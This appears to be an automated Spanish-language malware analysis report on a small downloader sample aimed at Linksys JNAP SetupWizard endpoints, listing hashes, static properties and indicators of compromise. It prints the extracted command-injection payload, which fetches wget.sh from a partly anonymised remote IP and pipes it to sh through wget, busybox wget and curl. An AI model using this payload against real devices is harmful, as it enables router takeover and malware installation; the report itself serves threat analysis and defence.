# 🧬 Payload Analysis

`824783e3cf8214f98ee6ba538833f0411898e13bc39acb241c1fb6a41f989689`

## 📌 Resumen

Texto ASCII de 469 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `SetupWizard` en `hxxp://linksys[.]com/jnap/setup/SetupWizard`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s ljnap`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/824783e3cf8214f98ee6ba538833f0411898e13bc39acb241c1fb6a41f989689.md](../../../../../malware-like/oraculo/downloader/824783e3cf8214f98ee6ba538833f0411898e13bc39acb241c1fb6a41f989689.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `824783e3cf8214f98ee6ba538833f0411898e13bc39acb241c1fb6a41f989689`
- **SHA1:** `e2cff86221cb1551c69d903e183206769f9325f5`
- **MD5:** `825d78c9976cf25a5a10507379302d48`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 469 B |
| Entropía | 5.4 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/setup/SetupWizard | strings |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh | strings |
| hash | 824783e3cf8214f98ee6ba538833f0411898e13bc39acb241c1fb6a41f989689 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
